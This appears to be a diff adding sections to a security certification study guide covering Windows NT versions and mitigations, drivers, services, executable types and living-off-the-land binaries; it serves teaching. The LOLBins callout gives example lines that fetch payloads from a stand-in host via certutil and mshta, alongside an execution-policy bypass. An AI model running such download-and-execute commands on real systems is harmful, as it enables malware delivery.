+      <tr><td class="cmd-name">NT 3.1</td><td>Windows NT 3.1</td><td>1993</td><td>First NT release. Microkernel-inspired design. No consumer adoption.</td></tr>
+      <tr><td class="cmd-name">NT 3.5 / 3.51</td><td>Windows NT 3.5 / 3.51</td><td>1994–95</td><td>Stability improvements. Server focus. Still no consumer market.</td></tr>
+      <tr><td class="cmd-name">NT 4.0</td><td>Windows NT 4.0</td><td>1996</td><td>Moved GDI/display code into kernel for performance — controversial, increased attack surface. Win32 subsystem matured. Common target in late 1990s exploits.</td></tr>
+      <tr><td class="cmd-name">NT 5.0</td><td>Windows 2000</td><td>2000</td><td>Active Directory introduced. Kerberos as default auth (replacing NTLM). EFS (Encrypted File System). IPsec support. Huge enterprise adoption.</td></tr>
+      <tr><td class="cmd-name">NT 5.1</td><td>Windows XP</td><td>2001</td><td>First consumer NT kernel. DEP introduced (SP2, 2004). ICF firewall. Fast user switching. Became dominant target for malware for a decade.</td></tr>
+      <tr><td class="cmd-name">NT 5.2</td><td>Windows Server 2003 / XP x64</td><td>2003</td><td>64-bit x64 support. Kernel Patch Protection (KPP/PatchGuard) in x64 edition — prevents runtime kernel patching. Driver signing required for 64-bit.</td></tr>
+      <tr><td class="cmd-name">NT 6.0</td><td>Windows Vista</td><td>2007</td><td>UAC introduced. ASLR and full DEP by default. Mandatory Integrity Control (MIC) — integrity levels (Low/Medium/High/System). BitLocker drive encryption. Kernel stack and heap randomization. Signed drivers enforced on 64-bit.</td></tr>
+      <tr><td class="cmd-name">NT 6.1</td><td>Windows 7</td><td>2009</td><td>AppLocker (application whitelisting). ASLR improvements. BranchCache. Biometric framework. HomeGroup. Most widely deployed OS for years — many organizations still running it at EOL in 2020.</td></tr>
+      <tr><td class="cmd-name">NT 6.2</td><td>Windows 8</td><td>2012</td><td>Secure Boot integration (requires UEFI). Early Launch Anti-Malware (ELAM). Measured Boot. SmartScreen filter. Metro/Modern UI. Weak market adoption.</td></tr>
+      <tr><td class="cmd-name">NT 6.3</td><td>Windows 8.1</td><td>2013</td><td>Biometric improvements. Workplace Join. Network Access Protection updates. Minor security refinements over 8.0.</td></tr>
+      <tr><td class="cmd-name">NT 10.0 (build 10240–19045)</td><td>Windows 10</td><td>2015–2023</td><td>Credential Guard (VBS). Device Guard / WDAC. Windows Hello (biometrics/FIDO2). Windows Defender ATP (EDR). Virtualization-Based Security (VBS). Control Flow Guard (CFG). Windows Sandbox. Multiple major feature updates per year via Semi-Annual Channel.</td></tr>
+      <tr><td class="cmd-name">NT 10.0 (build 22000+)</td><td>Windows 11</td><td>2021–present</td><td>TPM 2.0 and Secure Boot required for installation. VBS enabled by default on compatible hardware. Smart App Control. Memory integrity (HVCI) enabled by default on new installs. Pluton security processor support.</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <h3>The NT 5 Family — XP / Server 2003</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">NT 5.x Security Profile</div>
+      <ul class="bullets">
+        <li><strong>No ASLR</strong> — all binaries load at predictable addresses. Exploits are highly reliable and portable across all XP machines.</li>
+        <li><strong>No UAC</strong> — users run as full administrator by default. Any code that executes gets admin rights without prompting.</li>
+        <li><strong>DEP added late</strong> — only with XP SP2 (2004) and only for data execution. Easily bypassed via return-to-libc.</li>
+        <li><strong>No driver signing requirement</strong> — any unsigned driver loads silently in 32-bit XP.</li>
+        <li><strong>LM hash storage</strong> — older authentication; LM hashes trivially crackable (7-char split, uppercase only).</li>
+        <li>Dominant attack era: 2001–2014. MS08-067 (Conficker), MS03-026 (Blaster), MS04-011 (Sasser).</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">Kernel Number vs. Product Name</div>
+      <p style="font-size:0.82rem;line-height:1.7">The <code>ver</code> command in cmd.exe returns the NT kernel version, not the marketing name:</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="comment"># cmd.exe or PowerShell</span></span>
+        <span class="code-line"><span class="cmd">ver</span></span>
+        <span class="code-line"><span class="comment"># Windows XP:      5.1.2600</span></span>
+        <span class="code-line"><span class="comment"># Windows 7:       6.1.7601</span></span>
+        <span class="code-line"><span class="comment"># Windows 8.1:     6.3.9600</span></span>
+        <span class="code-line"><span class="comment"># Windows 10 21H2: 10.0.19044</span></span>
+        <span class="code-line"><span class="comment"># Windows 11 22H2: 10.0.22621</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="comment"># PowerShell</span></span>
+        <span class="code-line"><span class="cmd">[System.Environment]::OSVersion.Version</span></span>
+        <span class="code-line"><span class="cmd">(Get-WmiObject Win32_OperatingSystem).BuildNumber</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>The NT 6 Family — Vista through 8.1</h3>
+  <div class="card">
+    <div class="card-title">NT 6.x — The Security Architecture Overhaul</div>
+    <p style="font-size:0.83rem;line-height:1.7;margin-bottom:0.7rem">NT 6.0 (Vista) was the most significant security architecture shift in Windows history, driven by the <strong>Security Development Lifecycle (SDL)</strong> Microsoft adopted after the 2003 Trustworthy Computing initiative. Nearly every modern Windows exploit mitigation was introduced or matured in NT 6.x:</p>
+    <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;">
+    <table class="cmd-table">
+      <thead><tr><th>Mitigation</th><th>Introduced</th><th>What It Does</th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-name">ASLR</td><td>NT 6.0 (Vista)</td><td>Randomizes load addresses of stack, heap, and DLLs. Makes hardcoded addresses in exploits fail.</td></tr>
+        <tr><td class="cmd-name">UAC</td><td>NT 6.0 (Vista)</td><td>Split admin token. Even admins run as standard user by default. Elevation requires explicit prompt.</td></tr>
+        <tr><td class="cmd-name">Mandatory Integrity Control (MIC)</td><td>NT 6.0 (Vista)</td><td>Integrity levels: Untrusted &lt; Low &lt; Medium &lt; High &lt; System. Processes cannot write to objects at higher integrity levels. IE runs at Low; normal apps at Medium; admin at High.</td></tr>
+        <tr><td class="cmd-name">KPP / PatchGuard</td><td>NT 5.2 x64, improved in 6.x</td><td>Kernel Patch Protection detects and BSODs the system if kernel data structures (SSDT, IDT, GDT) are modified at runtime. Prevents rootkit kernel patching on 64-bit.</td></tr>
+        <tr><td class="cmd-name">Driver Signature Enforcement</td><td>NT 6.0 x64</td><td>All kernel-mode drivers must be signed. Unsigned drivers blocked. Bypassable via test signing mode or bootloader exploit.</td></tr>
+        <tr><td class="cmd-name">BitLocker</td><td>NT 6.0 (Vista)</td><td>Full-volume encryption for Windows partitions. TPM-backed key storage. Protects data at rest against physical theft.</td></tr>
+        <tr><td class="cmd-name">AppLocker</td><td>NT 6.1 (Win 7)</td><td>Application whitelisting by publisher signature, path, or hash. More granular than Software Restriction Policies.</td></tr>
+        <tr><td class="cmd-name">Secure Boot</td><td>NT 6.2 (Win 8)</td><td>UEFI verifies bootloader signature before execution. Prevents unsigned bootkits from loading.</td></tr>
+        <tr><td class="cmd-name">ELAM</td><td>NT 6.2 (Win 8)</td><td>Early Launch Anti-Malware: AV driver loaded before all other third-party drivers, allowing it to validate boot drivers before they run.</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </div>
+
+  <h3>The NT 10 Family — Windows 10 / 11</h3>
+  <div class="card">
+    <div class="card-title">Virtualization-Based Security (VBS) — The NT 10 Paradigm Shift</div>
+    <p style="font-size:0.83rem;line-height:1.7;margin-bottom:0.7rem">NT 10 introduced <strong>Virtualization-Based Security (VBS)</strong> — using the Hyper-V hypervisor to create an isolated memory region (Secure World / Virtual Secure Mode) that even a compromised kernel cannot access. This is architecturally different from anything in NT 5 or NT 6:</p>
+    <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;">
+    <table class="cmd-table">
+      <thead><tr><th>Feature</th><th>Build</th><th>What It Does</th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-name">Credential Guard</td><td>10 (1507)</td><td>LSASS credentials stored in Isolated User Mode (VSM). Even SYSTEM cannot read them. Defeats Mimikatz sekurlsa.</td></tr>
+        <tr><td class="cmd-name">Device Guard / WDAC</td><td>10 (1507)</td><td>Kernel-enforced code integrity policy. Only signed, whitelisted code runs — even as admin. More robust than AppLocker.</td></tr>
+        <tr><td class="cmd-name">HVCI / Memory Integrity</td><td>10 (1703)</td><td>Hypervisor-enforced Code Integrity: all kernel-mode code must be signed and is verified by the hypervisor, not just the kernel. Prevents kernel rootkits from loading unsigned code even if they bypass PatchGuard.</td></tr>
+        <tr><td class="cmd-name">Control Flow Guard (CFG)</td><td>10 (1507)</td><td>Compiler + runtime check that indirect calls only target valid function entry points. Defeats many ROP chain techniques.</td></tr>
+        <tr><td class="cmd-name">Windows Hello / FIDO2</td><td>10 (1507)</td><td>Biometric and hardware-key authentication. Credential never leaves the device. Phishing-resistant.</td></tr>
+        <tr><td class="cmd-name">TPM 2.0 required</td><td>11 (22000)</td><td>Minimum hardware requirement for Win 11 install. Enables remote attestation, sealed secrets, BitLocker without PIN.</td></tr>
+        <tr><td class="cmd-name">Smart App Control</td><td>11 (22621)</td><td>Cloud-based reputation check for every executable before it runs. Replaces SmartScreen for fresh installs.</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </div>
+
+  <h3>Why Kernel Version Matters for Security Work</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Exploit Reliability by NT Version</div>
+      <ul class="bullets">
+        <li><strong>NT 5.x target</strong>: No ASLR, no UAC, predictable addresses. Buffer overflow → reliable shellcode execution. Exploits are portable.</li>
+        <li><strong>NT 6.x target</strong>: Need info-leak to defeat ASLR. Need UAC bypass or high-priv context. Exploit chains are longer.</li>
+        <li><strong>NT 10 + VBS</strong>: Credential Guard defeats in-memory credential theft. HVCI defeats most kernel rootkits. Exploit chains require hypervisor-level bugs.</li>
+        <li>Identifying target OS version is one of the first steps in a penetration test — it determines which techniques are viable.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">Identifying Windows Version Remotely</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="comment"># From Nmap — SMB OS detection</span></span>
+        <span class="code-line"><span class="cmd">nmap</span> <span class="flag">-O --script smb-os-discovery</span> <span class="val">target</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="comment"># TTL fingerprinting (rough)</span></span>
+        <span class="code-line"><span class="comment"># Windows: TTL ~128  Linux: TTL ~64</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="comment"># From RDP banner (port 3389)</span></span>
+        <span class="code-line"><span class="cmd">nmap</span> <span class="flag">-sV -p 3389</span> <span class="val">target</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="comment"># From SMB negotiation</span></span>
+        <span class="code-line"><span class="cmd">nmap</span> <span class="flag">--script smb2-security-mode</span> <span class="val">target</span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// CNAB Exam Tip</div>
+    Know the major security boundary between each NT family: NT 5 = pre-mitigation era; NT 6 = ASLR + UAC + MIC + PatchGuard; NT 10 = VBS/hypervisor isolation. The question "which Windows version introduced UAC?" = Vista (NT 6.0). "Which introduced Credential Guard?" = Windows 10 (NT 10.0).
+  </div>
+</div>
+
+<!-- ============================================================ DRIVERS -->
+<div class="section" id="drivers">
+  <div class="section-header">
+    <div class="section-icon">🔌</div>
+    <div><div class="section-title">Device Drivers</div><div class="section-meta">kernel mode · ring levels · driver types · signing · management</div></div>
+  </div>
+
+  <h3>CPU Protection Rings</h3>
+  <div class="card">
+    <div class="card-title">Privilege Levels</div>
+    <p>Modern CPUs implement privilege rings: <strong>Ring 0 (Kernel mode)</strong> has unrestricted access to all hardware and memory — the OS kernel and device drivers run here. <strong>Ring 3 (User mode)</strong> is where applications run — restricted; cannot directly access hardware or arbitrary memory. Rings 1 and 2 are rarely used on x86 (hypervisors sometimes use Ring -1 / VMX root mode). A kernel-mode driver bug or compromise = full system compromise. This is why driver signing is enforced on 64-bit Windows.</p>
+  </div>
+
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Windows Drivers</div>
+      <ul class="bullets">
+        <li><strong>Location</strong>: <code>C:\Windows\System32\drivers\</code> for kernel drivers (.sys)</li>
+        <li><strong>Registry</strong>: HKLM\SYSTEM\CurrentControlSet\Services — each service/driver has ImagePath, Type, Start entries</li>
+        <li><strong>Type values</strong>: 1=kernel driver, 2=file system driver, 4=adapter, 8=recognizer</li>
+        <li><strong>64-bit Windows</strong>: Requires kernel-mode drivers to be digitally signed (WHQL or cross-signed). Unsigned drivers blocked by default (Secure Boot enforced on modern systems)</li>
+        <li><strong>KMCS</strong>: Kernel Mode Code Signing — part of Windows integrity policy</li>
+        <li><strong>DSE bypass</strong>: Attackers use vulnerable signed drivers (BYOVD — Bring Your Own Vulnerable Driver) to disable DSE and load unsigned malicious drivers</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">Linux Kernel Modules</div>
+      <ul class="bullets">
+        <li><strong>Location</strong>: <code>/lib/modules/$(uname -r)/</code> — organized by type</li>
+        <li><strong>Extension</strong>: .ko (kernel object)</li>
+        <li><strong>Loading</strong>: <code>modprobe</code> (resolves deps) or <code>insmod</code> (raw load)</li>
+        <li><strong>Unloading</strong>: <code>rmmod module_name</code> (fails if in use)</li>
+        <li><strong>Config</strong>: <code>/etc/modules</code> for modules to load at boot; <code>/etc/modprobe.d/</code> for options/blacklists</li>
+        <li><strong>Module signing</strong>: Linux supports module signing via CONFIG_MODULE_SIG. Required on UEFI Secure Boot systems</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Driver Management Commands</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># Windows</span></span>
+    <span class="code-line"><span class="cmd">driverquery</span>                          <span class="comment"># List all installed drivers</span></span>
+    <span class="code-line"><span class="cmd">driverquery</span> <span class="flag">/v /fo csv</span> &gt; <span class="path">drivers.csv</span> <span class="comment"># Verbose CSV output</span></span>
+    <span class="code-line"><span class="cmd">devmgmt.msc</span>                          <span class="comment"># Device Manager GUI</span></span>
+    <span class="code-line"><span class="cmd">pnputil</span> <span class="flag">/enum-drivers</span>              <span class="comment"># List drivers in driver store</span></span>
+    <span class="code-line"><span class="cmd">sc query type= driver</span>               <span class="comment"># List running kernel drivers via sc</span></span>
+    <span class="code-line"><span class="cmd">Get-WindowsDriver</span> <span class="flag">-Online</span>           <span class="comment"># PowerShell: all installed drivers</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Linux</span></span>
+    <span class="code-line"><span class="cmd">lsmod</span>                                <span class="comment"># List loaded kernel modules</span></span>
+    <span class="code-line"><span class="cmd">modinfo</span> <span class="val">e1000</span>                        <span class="comment"># Info about module (author, version, params)</span></span>
+    <span class="code-line"><span class="cmd">modprobe</span> <span class="val">usb_storage</span>                <span class="comment"># Load module with dependencies</span></span>
+    <span class="code-line"><span class="cmd">modprobe</span> <span class="flag">-r</span> <span class="val">usb_storage</span>             <span class="comment"># Remove module</span></span>
+    <span class="code-line"><span class="cmd">dmesg</span> | <span class="cmd">grep</span> <span class="val">error</span>                 <span class="comment"># Kernel ring buffer (driver error messages)</span></span>
+    <span class="code-line"><span class="cmd">dmesg</span> <span class="flag">-T</span>                            <span class="comment"># With human-readable timestamps</span></span>
+    <span class="code-line"><span class="cmd">cat</span> <span class="path">/proc/modules</span>                   <span class="comment"># Raw module info from kernel</span></span>
+  </div>
+
+  <div class="callout danger">
+    <div class="callout-label danger">// BYOVD — Bring Your Own Vulnerable Driver</div>
+    A modern attack technique: attacker loads a legitimately signed but vulnerable kernel driver (e.g., an old gaming anti-cheat driver), exploits the vulnerability while in Ring 0, and uses that to disable Driver Signature Enforcement or load an unsigned malicious driver. Used by APTs and ransomware groups (BlackByte, ALPHV). Defense: block known vulnerable drivers via Windows Defender Application Control (WDAC) blocklist.
+  </div>
+</div>
+
+<!-- ============================================================ SERVICES -->
+<div class="section" id="services">
+  <div class="section-header">
+    <div class="section-icon">⚡</div>
+    <div><div class="section-title">System Services</div><div class="section-meta">init · systemd · Windows SCM · start types · config locations · security</div></div>
+  </div>
+
+  <h3>Linux Init Systems Evolution</h3>
+  <div class="card">
+    <div class="card-title">From SysV to systemd</div>
+    <div class="key-val-grid">
+      <div class="kv-key">SysV init</div><div class="kv-val">Original Linux init. Sequential startup scripts in /etc/init.d/. Runlevels 0-6 define system state. Slow — serial execution.</div>
+      <div class="kv-key">Upstart</div><div class="kv-val">Event-driven init (Ubuntu 2006-2014). Replaced by systemd. Scripts still in /etc/init/</div>
+      <div class="kv-key">systemd</div><div class="kv-val">Current standard. Parallel startup (dependency-based). Unit files replace scripts. Journald replaces syslog. Socket activation. Container-aware.</div>
+    </div>
+  </div>
+
+  <h3>systemd Unit Files</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># /etc/systemd/system/myapp.service — example unit file</span></span>
+    <span class="code-line"><span class="val">[Unit]</span></span>
+    <span class="code-line"><span class="val">Description</span>=My Application</span>
+    <span class="code-line"><span class="val">After</span>=network.target              <span class="comment"># Start after network is up</span></span>
+    <span class="code-line"><span class="val">Requires</span>=postgresql.service       <span class="comment"># Hard dependency (fails if postgres fails)</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="val">[Service]</span></span>
+    <span class="code-line"><span class="val">Type</span>=simple                       <span class="comment"># forking|oneshot|notify|idle</span></span>
+    <span class="code-line"><span class="val">User</span>=appuser                      <span class="comment"># Run as non-root user</span></span>
+    <span class="code-line"><span class="val">ExecStart</span>=<span class="path">/usr/bin/myapp</span> <span class="flag">--config /etc/myapp.conf</span></span>
+    <span class="code-line"><span class="val">ExecReload</span>=/bin/kill <span class="flag">-HUP</span> <span class="val">$MAINPID</span>   <span class="comment"># Signal for reload</span></span>
+    <span class="code-line"><span class="val">Restart</span>=on-failure               <span class="comment"># always|on-failure|on-abnormal</span></span>
+    <span class="code-line"><span class="val">RestartSec</span>=5s</span>
+    <span class="code-line"><span class="val">StandardOutput</span>=journal</span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="val">[Install]</span></span>
+    <span class="code-line"><span class="val">WantedBy</span>=multi-user.target        <span class="comment"># = runlevel 3 equivalent</span></span>
+  </div>
+
+  <h3>systemd Management Commands</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">status</span>   <span class="path">sshd</span>         <span class="comment"># Detailed status with recent log lines</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">start</span>    <span class="path">sshd</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">stop</span>     <span class="path">sshd</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">restart</span>  <span class="path">sshd</span>         <span class="comment"># Stop + start</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">reload</span>   <span class="path">nginx</span>        <span class="comment"># Send SIGHUP (reload config, no downtime)</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">enable</span>   <span class="path">sshd</span>         <span class="comment"># Start on boot (creates symlink in /etc/systemd)</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">disable</span>  <span class="path">sshd</span>         <span class="comment"># Remove boot symlink</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">mask</span>     <span class="path">telnet</span>       <span class="comment"># Prevent from being started at all (links to /dev/null)</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">list-units</span> <span class="flag">--type=service --state=running</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">list-unit-files</span> <span class="flag">--type=service</span>  <span class="comment"># Shows enabled/disabled state</span></span>
+    <span class="code-line"><span class="cmd">systemctl</span> <span class="val">daemon-reload</span>               <span class="comment"># Reload unit file changes</span></span>
+    <span class="code-line"><span class="cmd">journalctl</span> <span class="flag">-u</span> <span class="path">nginx</span> <span class="flag">-n 100 -f</span>         <span class="comment"># Follow last 100 lines of service log</span></span>
+    <span class="code-line"><span class="cmd">journalctl</span> <span class="flag">--since "2024-01-01" --until "2024-01-02"</span></span>
+    <span class="code-line"><span class="cmd">journalctl</span> <span class="flag">-p err</span>                       <span class="comment"># Only error-level and above</span></span>
+  </div>
+
+  <h3>Service Config Locations — Linux</h3>
+  <div class="key-val-grid">
+    <div class="kv-key">/lib/systemd/system/</div><div class="kv-val">Package-installed unit files. Don't edit directly (overwritten on update)</div>
+    <div class="kv-key">/etc/systemd/system/</div><div class="kv-val">Admin/custom unit files. Override vendor files. Takes priority over /lib/</div>
+    <div class="kv-key">/etc/systemd/system/svc.d/override.conf</div><div class="kv-val">Drop-in overrides for specific unit settings without replacing whole file</div>
+    <div class="kv-key">/etc/init.d/</div><div class="kv-val">SysV init scripts (legacy). systemd provides shim compatibility</div>
+    <div class="kv-key">/etc/cron.d/ /etc/crontab</div><div class="kv-val">Scheduled tasks. Crontab format: minute hour day month weekday command</div>
+    <div class="kv-key">/etc/rc.local</div><div class="kv-val">Legacy startup script run at end of boot (still present on many systems)</div>
+  </div>
+
+  <h3>Windows Service Management</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">sc query</span> <span class="flag">type= all state= all</span>      <span class="comment"># All services/drivers regardless of state</span></span>
+    <span class="code-line"><span class="cmd">sc query</span> <span class="val">wuauserv</span>                  <span class="comment"># Query specific service (Windows Update)</span></span>
+    <span class="code-line"><span class="cmd">sc start</span>  <span class="val">ServiceName</span></span>
+    <span class="code-line"><span class="cmd">sc stop</span>   <span class="val">ServiceName</span></span>
+    <span class="code-line"><span class="cmd">sc config</span> <span class="val">ServiceName</span> <span class="flag">start=</span><span class="val">auto</span>  <span class="comment"># auto|demand|disabled|boot|system</span></span>
+    <span class="code-line"><span class="cmd">sc create</span> <span class="val">MySvc</span> <span class="flag">binPath=</span><span class="path">"C:\app.exe"</span> <span class="flag">start=</span><span class="val">auto</span>  <span class="comment"># Create service</span></span>
+    <span class="code-line"><span class="cmd">sc delete</span> <span class="val">MySvc</span>                    <span class="comment"># Delete service</span></span>
+    <span class="code-line"><span class="cmd">sc failure</span> <span class="val">MySvc</span> <span class="flag">reset=</span><span class="val">60</span> <span class="flag">actions=</span><span class="val">restart/5000</span>  <span class="comment"># Auto-restart on failure</span></span>
+    <span class="code-line"><span class="cmd">services.msc</span>                       <span class="comment"># GUI Services Manager</span></span>
+    <span class="code-line"><span class="cmd">net start</span> / <span class="cmd">net stop</span> <span class="val">ServiceName</span>  <span class="comment"># Legacy net commands</span></span>
+    <span class="code-line"><span class="comment"># PowerShell</span></span>
+    <span class="code-line"><span class="cmd">Get-Service</span> | <span class="cmd">Where-Object</span> {<span class="val">$_.Status</span> <span class="flag">-eq</span> <span class="val">"Running"</span>}</span>
+    <span class="code-line"><span class="cmd">Set-Service</span> <span class="flag">-Name</span> <span class="val">wuauserv</span> <span class="flag">-StartupType</span> <span class="val">Disabled</span></span>
+  </div>
+
+  <div class="callout">
+    <div class="callout-label warn">// Windows Service Start Type Values</div>
+    Registry value under HKLM\SYSTEM\CurrentControlSet\Services\&lt;name&gt;\Start:<br>
+    <strong>0</strong>=Boot (kernel driver, loaded by bootloader before kernel), <strong>1</strong>=System (loaded early by kernel), <strong>2</strong>=Automatic (after boot), <strong>3</strong>=Manual (on demand), <strong>4</strong>=Disabled<br>
+    <strong>Delayed Auto Start</strong>: Start=2 + DelayedAutostart=1 (starts ~2 min after login, reduces boot time)
+  </div>
+</div>
+
+<!-- ============================================================ EXECUTABLES -->
+<div class="section" id="executables">
+  <div class="section-header">
+    <div class="section-icon">📦</div>
+    <div><div class="section-title">Executable File Types & Extensions</div><div class="section-meta">PE format · ELF · scripts · magic bytes · living off the land</div></div>
+  </div>
+
+  <h3>Windows Executable Types</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Extension</th><th>Type</th><th>Security Notes</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">.exe</td><td>PE (Portable Executable). Standard Windows binary.</td><td>Requires code signing on modern Windows for SmartScreen trust</td></tr>
+      <tr><td class="cmd-name">.dll</td><td>Dynamic Link Library. PE format. Shared code loaded into other processes.</td><td>DLL hijacking: place malicious DLL in higher-priority search path</td></tr>
+      <tr><td class="cmd-name">.sys</td><td>Kernel-mode driver. Still PE format. Loaded into kernel space.</td><td>Requires WHQL signing on 64-bit; most dangerous if malicious</td></tr>
+      <tr><td class="cmd-name">.bat / .cmd</td><td>CMD batch script. Executed by cmd.exe.</td><td>No signing required; often used in malware delivery chains</td></tr>
+      <tr><td class="cmd-name">.ps1</td><td>PowerShell script. Blocked by default (ExecutionPolicy).</td><td>Can be bypassed: <code>powershell -ExecutionPolicy Bypass -File script.ps1</code></td></tr>
+      <tr><td class="cmd-name">.vbs / .js / .jse</td><td>VBScript / JScript. Run by Windows Script Host (wscript.exe / cscript.exe).</td><td>Heavily used in email-based malware. Consider disabling WSH.</td></tr>
+      <tr><td class="cmd-name">.msi</td><td>Windows Installer package. Can install software and run custom actions.</td><td>Custom actions can run arbitrary code — often abused in supply chain attacks</td></tr>
+      <tr><td class="cmd-name">.scr</td><td>Screensaver. Actually a PE .exe with different extension. Executed by Windows as executable.</td><td>Extension disguise; double-click executes just like .exe</td></tr>
+      <tr><td class="cmd-name">.lnk</td><td>Shortcut file. Contains path + arguments to launch.</td><td>Can launch powershell or cmd with malicious args; Stuxnet exploited LNK parsing</td></tr>
+      <tr><td class="cmd-name">.hta</td><td>HTML Application. Full Windows application running HTML/JScript with elevated trust.</td><td>Often used by red teams; runs with full user privileges</td></tr>
+      <tr><td class="cmd-name">.cpl</td><td>Control Panel applet. PE DLL called by control.exe.</td><td>Can be used for code execution: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code></td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Unix/Linux Executable Types</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Type</th><th>Description</th><th>Identification</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">ELF Binary</td><td>Executable and Linkable Format. Standard format for Linux/Unix executables, shared libraries, core dumps, and kernel modules.</td><td>Magic bytes: <code>7f 45 4c 46</code> (\x7fELF). No extension required.</td></tr>
+      <tr><td class="cmd-name">Shell Scripts</td><td>Text files with shebang line and execute bit. Interpreted by specified shell.</td><td>First line: <code>#!/bin/bash</code>, <code>#!/usr/bin/env python3</code></td></tr>
+      <tr><td class="cmd-name">.so (Shared Object)</td><td>Linux equivalent of Windows DLL. ELF format. Loaded by ld.so dynamic linker.</td><td>LD_PRELOAD hijacking: load malicious .so before standard libs</td></tr>
+      <tr><td class="cmd-name">.ko (Kernel Object)</td><td>Kernel module. ELF format. Runs in Ring 0.</td><td>modinfo shows metadata; lsmod shows loaded</td></tr>
+      <tr><td class="cmd-name">SGID/SUID binaries</td><td>Run with owner/group privileges regardless of who executes</td><td><code>find / -perm -4000</code> for SUID; common examples: passwd, sudo, ping</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>PE File Format Structure</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="val">DOS Header</span>    <span class="comment"># "MZ" magic bytes (0x4D5A) + offset to PE header</span></span>
+    <span class="code-line"><span class="val">DOS Stub</span>      <span class="comment"># "This program cannot be run in DOS mode" legacy message</span></span>
+    <span class="code-line"><span class="val">PE Header</span>     <span class="comment"># "PE\0\0" signature + COFF header (machine type, # sections)</span></span>
+    <span class="code-line"><span class="val">Optional Header</span> <span class="comment"># Entry point, image base, subsystem, data directory pointers</span></span>
+    <span class="code-line"><span class="val">Section Table</span> <span class="comment"># .text (code), .data (init data), .rdata (read-only), .rsrc (resources)</span></span>
+    <span class="code-line"><span class="val">.text section</span> <span class="comment"># Executable code (Entry Point is within this)</span></span>
+    <span class="code-line"><span class="val">.rdata</span>        <span class="comment"># Import/Export tables, string constants</span></span>
+    <span class="code-line"><span class="val">.data</span>         <span class="comment"># Initialized global/static variables</span></span>
+    <span class="code-line"><span class="val">Overlay</span>       <span class="comment"># Authenticode signature appended here (after all sections)</span></span>
+  </div>
+
+  <h3>Identifying Executables by Magic Bytes</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Magic Bytes (hex)</th><th>File Type</th><th>Command</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">4D 5A (MZ)</td><td>Windows PE (exe/dll/sys)</td><td><code>file malware.bin</code></td></tr>
+      <tr><td class="cmd-name">7F 45 4C 46 (\x7fELF)</td><td>Linux ELF binary</td><td><code>file binary</code> → "ELF 64-bit LSB executable"</td></tr>
+      <tr><td class="cmd-name">23 21 (#!)</td><td>Script with shebang</td><td>Read first line to find interpreter</td></tr>
+      <tr><td class="cmd-name">CA FE BA BE</td><td>Java class file or universal binary (macOS)</td><td><code>file JavaClass.class</code></td></tr>
+      <tr><td class="cmd-name">50 4B 03 04 (PK)</td><td>ZIP / Java JAR / DOCX / APK</td><td>Zip-based formats use same magic</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Living Off the Land (LotL) Binaries</h3>
+  <div class="callout danger">
+    <div class="callout-label danger">// LOLBins — Exam Relevant</div>
+    Attackers use trusted built-in Windows binaries to execute code, download files, or bypass controls — no malware to detect via signatures. Key examples:
+    <br><br>
+    <strong>certutil.exe</strong>: Decode base64 (<code>certutil -decode encoded.b64 out.exe</code>) or download files (<code>certutil -urlcache -split -f http://evil.com/p.exe</code>)<br>
+    <strong>mshta.exe</strong>: Execute HTA files or remote JS/VBS (<code>mshta http://evil.com/payload.hta</code>)<br>
+    <strong>regsvr32.exe</strong>: Execute COM DLLs or remote scripts (Squiblydoo technique)<br>
